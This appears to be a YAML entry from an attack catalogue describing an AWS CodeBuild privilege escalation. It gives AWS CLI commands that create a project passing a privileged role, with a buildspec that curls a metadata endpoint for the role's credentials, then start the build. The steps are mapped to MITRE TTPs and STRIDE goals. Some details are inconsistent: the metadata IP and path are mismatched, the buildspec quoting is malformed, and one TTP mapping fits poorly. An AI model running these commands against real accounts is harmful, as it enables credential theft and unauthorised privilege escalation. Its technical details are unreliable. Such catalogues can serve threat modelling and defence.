attack:

attack:
  id: AWS-CODEBUILD-PRIVESC-001
  name: AWS CodeBuild Service Role Credential Extraction
  overview: An attacker exploits iam:PassRole and codebuild:CreateProject permissions to create a malicious CodeBuild project that extracts sensitive IAM service role credentials by querying the instance metadata service.
  steps:
    - title: Create Malicious CodeBuild Project
      command: |
        aws codebuild create-project \
          --name malicious-build \
          --source type=NO_SOURCE,buildspec="version: 0.2
        phases:
          build:
            commands:
              - curl http://169.254.170.2/latest/meta-data/iam/security-credentials/"
          --artifacts type=NO_ARTIFACTS \
          --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:1.0,computeType=BUILD_GENERAL1_SMALL \
          --service-role arn:aws:iam::<ACCOUNT_ID>:role/<PRIVILEGED_ROLE>
      dependencies:
        - iam:PassRole permission
        - codebuild:CreateProject permission
        - Access to a privileged IAM service role
      result: Malicious CodeBuild project created with a buildspec designed to extract IAM role credentials
      ttp: T1552.005 Unsecured Credentials - Cloud Instance Metadata
    
    - title: Start Malicious Build
      command: aws codebuild start-build --project-name malicious-build
      dependencies:
        - Successful creation of malicious CodeBuild project
      result: Build executes, exposing temporary credentials from the service role's metadata
      ttp: T1098.001 Account Manipulation - Additional Cloud Credentials
    
    - title: Credential Extraction and Potential Misuse
      command: N/A (happens within build container)
      dependencies:
        - Successful retrieval of IAM role credentials
      result: Attacker obtains temporary AWS credentials with potentially elevated permissions, enabling further unauthorized actions
      ttp: T1550.002 Use Alternate Authentication Material - Pass the Ticket
  
  stride_goal:
    - Information Disclosure
    - Elevation of Privilege